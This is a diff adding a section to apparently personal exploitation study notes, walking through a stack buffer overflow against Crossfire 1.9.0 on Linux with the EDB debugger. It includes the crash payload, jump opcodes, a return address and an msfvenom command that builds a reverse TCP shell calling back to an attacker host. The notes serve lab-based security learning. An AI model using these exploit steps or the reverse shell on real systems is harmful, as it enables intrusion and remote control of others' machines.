@@ -174,3 +174,81 @@ To be sure the shell is loaded in the ESP, we can create a breakpoint in the add
 After running it we got the shell ...
 
 ![](BoF_files/image008.jpg)
+
+![](BoF_files/image008.jpg)
+
+**BUFFER OVERFLOW IN LINUX**
+
+We will use Crossfire 1.9.0 as it is vulnerable. It has a network-based BoF when strings of more than 4000 bytes in the setup sound command
+
+We will use the **Evans Debugger (EDB)** (Not in Raspberry PI as this is for x86)
+
+Memory protection techniques in Linux: Data Execution Prevention (DEP), Address Space Layout Randomization (ASLR), and Stack Canaries. To avoid them, we need to use a Crossfire compiled without stack-smashing protection (stack canaries), ASLR, and DEP.
+
+To crash the app we can use a payload like:
+
+crash = "\\x41" \* 4379
+
+buffer = "\\x11(setup sound " + crash + "\\x90\\x00#"
+
+To identify that payload, we should follow the same process to create the spike scripts and start playing with them to identify where the app is vulnerable.
+
+**Testing the crash:**
+
+The process is almost the same than in Windows but using edb debugger instead of immunity in this case.
+
+In the python script the test 6 is used to validate the application crashes when receiving this information.
+
+After crashing the application, we should observe the register values to identify how can we continue the exploit.
+
+In this case we can observe:
+
+- ESP points to the last part of the string we sent (position 4363 to 4369). This left only 7 bytes to use. The shell code cannot be injected there
+
+- However, we can observe the EAX contains the memory position where the buffer we have sent starts: ("setup sound AAAAAAA...").
+
+Analysing this data, we can see there are 12 bytes (including the space) before the part we have control of (buffer) and we have control over the EAX.
+
+What we need to do in this case is:
+
+- Use the 7 bytes we have control of that are pointed by ESP (position 4363 to 4369) to inject something that let us go to EAX + 12
+
+- This can be done by injecting ADD EAX,12 and JMP EAX in the last 7 bytes.
+
+To get the opcodes for this operations we can use msf-nasm\_shell:
+
+    msf-nasm\_shell
+    \>add eax,12    \=> 83C00C add eax,byte +0xc
+    \> jmp eax      \=> FFE0 jmp eax
+    
+    \#This is "\\x83\\xc0\\x0c\\xff\\xe0". It uses only 5 bytes from the 7 available so we can add 2 nops at the end.
+
+We need to inject this opcodes in the part where the ESP is pointing to.
+
+**Testing the ESP value**
+
+In the python script 7 I created a PoC to validate we can control ESP and AIX as analysed.
+
+After running we can observe EAX (already in control in test 6) and ESP are controlled by us and we injected the desired values.
+
+**Checking badchars**
+
+Before completing the shellcode, it is important to check badchars in the same way than in windows. By sending all the possible chars and observing the stack to validate the information is received in a good way. If someone is missing, remove it and test it again until we have all the possible values sent in the stack without problem.
+
+The test 8 includes this part. Including the buffer fulfilling with A's. That's important as we should maintain the same buffer size to keep the registers with the values we want.
+
+**Finding the return address and Injecting the Shellcode**
+
+So the last part is to control the EIP. We need it to point to an address with the instruction JMP ESP
+
+EDB debugger comes with the a plugging called Opcodesearcher (Pluggins -> OpcodeSearch or ctrl+o)
+
+Looking for jump equivalent ESP -> EIP and selecting any of the process we can find one at address 08134596 (\\x96\\x45\\x13\\x08 in little indian)
+
+    eip = b**"**\\x96\\x45\\x13\\x08**"**
+
+Now we need to create the reverse shell for linux (-f to define language python in this case, -v name of the variable to assign the shellcode, -b list of badchars)
+
+    msfvenom -p linux/x86/shell\_reverse\_tcp LHOST=\[KALI\_IP\] LPORT=443 -b "\\x00\\x20" -f py -v shellcode
+
+In the python script 9 is used to complete this test
